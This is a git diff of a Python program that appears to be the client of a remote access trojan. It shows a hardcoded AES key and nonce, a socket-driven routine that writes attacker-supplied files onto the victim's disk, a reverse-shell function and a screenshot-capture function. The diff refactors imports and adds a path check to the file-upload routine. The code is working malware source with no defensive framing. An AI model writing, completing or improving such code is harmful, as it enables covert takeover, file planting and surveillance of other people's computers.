@@ -5,6 +5,8 @@ import platform
 import getpass,os
 import subprocess, threading
 from Crypto.Cipher import AES
+import pyautogui
+from pyautogui import PyAutoGUIException
 
 key = b'ZiyaGadimli12345'
 nonce = b'ZiyaGadimli54321'
@@ -47,19 +49,22 @@ def download(file_path):
 
 def upload():
     path = s.recv(4096).decode()
-    if not path.endswith('\\'):
-        path += '\\'
-    file_name = s.recv(4096).decode()
-    path += file_name
-    file = open(path, 'ab')
-    a = s.recv(4096)
-    a = ciper.decrypt(a)
-    while a != b"\n\r":
-        file.write(a)
+    if os.path.isdir(path):
+        if not path.endswith('\\'):
+            path += '\\'
+        file_name = s.recv(4096).decode()
+        path += file_name
+        file = open(path, 'ab')
         a = s.recv(4096)
         a = ciper.decrypt(a)
-    file.close()
-    print("File sent succesfully!")
+        while a != b"\n\r":
+            file.write(a)
+            a = s.recv(4096)
+            a = ciper.decrypt(a)
+        file.close()
+        print("File sent succesfully!")
+    else:
+        print("\n[*] It looks like the path you entered is not path.Double check it please")
 
 def rev_shell(socket):
     
@@ -97,8 +102,7 @@ def rev_shell(socket):
 
 
 def ss():
-    import pyautogui
-    from pyautogui import PyAutoGUIException
+    
     try:
         my_screenshot = pyautogui.screenshot()
         file_name = "screenshoot_" + time.ctime().split()[3].replace(':', '-') + '.png'
